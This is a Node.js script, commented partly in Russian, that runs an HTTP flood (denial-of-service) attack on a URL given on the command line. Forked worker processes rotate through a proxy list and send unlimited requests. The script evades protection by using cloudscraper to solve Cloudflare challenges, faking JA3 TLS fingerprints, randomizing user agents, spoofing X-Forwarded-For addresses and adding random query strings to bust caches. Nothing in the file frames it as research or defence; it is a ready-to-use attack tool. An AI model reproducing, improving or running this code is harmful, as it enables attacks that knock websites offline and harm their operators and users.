require('events').EventEmitter.defaultMaxListeners = Infinity;
const cloudscraper = require('cloudscraper');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const tough = require('tough-cookie');
const http2 = require('http2-wrapper');
const userAgents = require('user-agents');
const cluster = require('cluster');
const { SocksProxyAgent } = require('socks-proxy-agent');

// Конфигурация
const TARGET = process.argv[2];
const DURATION = parseInt(process.argv[3]) * 1000;
const REQUESTS_PER_THREAD = parseInt(process.argv[4]);
const PROXY_FILE = process.argv[5];
const THREADS = parseInt(process.argv[6]);

let proxies = fs.readFileSync(PROXY_FILE, 'utf-8')
    .split('\n')
    .filter(Boolean)
    .map(p => p.trim())
    .map(p => {
        if (!p.startsWith('http://') && !p.startsWith('https://') && !p.startsWith('socks://')) {
            return `http://${p}`;
        }
        return p;
    });

const JA3_FINGERPRINTS = [
    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0",
    "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0"
];

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateFakeTLS() {
    return {
        ja3: JA3_FINGERPRINTS[randomInt(0, JA3_FINGERPRINTS.length - 1)],
        alpn: ['h2', 'http/1.1'],
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256'
    };
}

function createAgent(proxyUrl) {
    if (proxyUrl.includes('socks://')) {
        return new SocksProxyAgent(proxyUrl);
    }

    const options = {
        tls: generateFakeTLS(),
        rejectUnauthorized: false
    };

    if (proxyUrl.includes('@')) {
        const [auth, host] = proxyUrl.split('@');
        const [user, pass] = auth.replace(/https?:\/\//, '').split(':');
        options.proxyUrl = `http://${host}`;
        options.proxyAuth = `${user}:${pass}`;
    } else {
        options.proxyUrl = proxyUrl;
    }

    return new http2.proxies.HTTP2ProxyAgent(options);
}

async function flood() {
    while (true) {
        const proxy = proxies[randomInt(0, proxies.length - 1)];
        try {
            const agent = createAgent(proxy);
            const cookieJar = new tough.CookieJar();

            const headers = {
                'User-Agent': userAgents.random(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'TE': 'trailers',
                'X-Forwarded-For': `${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}.${randomInt(1, 255)}`
            };

            const options = {
                url: TARGET + '?' + crypto.randomBytes(8).toString('hex'),
                method: ['GET', 'POST', 'HEAD', 'OPTIONS'][randomInt(0, 3)],
                headers: headers,
                agent: agent,
                jar: cookieJar,
                timeout: 10000,
                followAllRedirects: true,
                challengesToSolve: 5,
                cloudflareMaxTimeout: 15000
            };

            await cloudscraper(options);
            console.log(`[+] Request sent through ${proxy.replace(/:[^:]*@/, ':*****@')}`);

            for (let i = 0; i < REQUESTS_PER_THREAD; i++) {
                setTimeout(() => {
                    cloudscraper(options).catch(() => {});
                }, randomInt(50, 500));
            }
        } catch (err) {
            console.error(`[-] Error via ${proxy}: ${err.message}`);
            continue;
        }
    }
}

if (cluster.isMaster) {
    console.log(`[!] Starting ${THREADS} threads with ${REQUESTS_PER_THREAD} requests each`);
    console.log(`[!] Target: ${TARGET}`);
    console.log(`[!] Duration: ${DURATION/1000} seconds`);
    console.log(`[!] Loaded ${proxies.length} proxies`);
    
    for (let i = 0; i < THREADS; i++) {
        cluster.fork();
    }
} else {
    flood();
}

setTimeout(() => {
    console.log('[!] Attack finished');
    process.exit(0);
}, DURATION);

process.on('uncaughtException', (err) => {
    console.error('[!] Uncaught Exception:', err.message);
});
process.on('unhandledRejection', (err) => {
    console.error('[!] Unhandled Rejection:', err.message);
});
